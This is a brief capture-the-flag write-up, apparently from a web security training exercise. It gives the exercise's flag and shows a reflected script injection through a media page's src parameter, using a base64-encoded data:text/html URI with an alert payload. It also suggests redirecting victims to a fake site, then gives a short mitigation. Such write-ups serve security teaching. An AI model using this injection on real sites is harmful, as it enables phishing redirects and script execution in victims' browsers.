# MEDIA REQUEST

## The flag
```
THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```

## How to find it ?
On the page http://{IP_ADDRESS}/

The NSA image (the one with headphone) leads to http://{IP_ADDRESS}/?page=media&src=nsa
You can change nsa to base64 script
```
"data:text/html;base64," + base64("<script>alert("wtf");</script>")
> data:text/html;base64,PHNjcmlwdD5hbGVydCgid3RmIik7PC9zY3JpcHQ+
```
http://{IP_ADDRESS}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgid3RmIik7PC9zY3JpcHQ+

## How to use it ?
Inject any script ou like and, for exemple redirect to a fake site

## How to avoid it ?
> Check type of the response and do not accept text/html by default

---

[RETURN](https://github.com/tillderoquefeuil/darkly)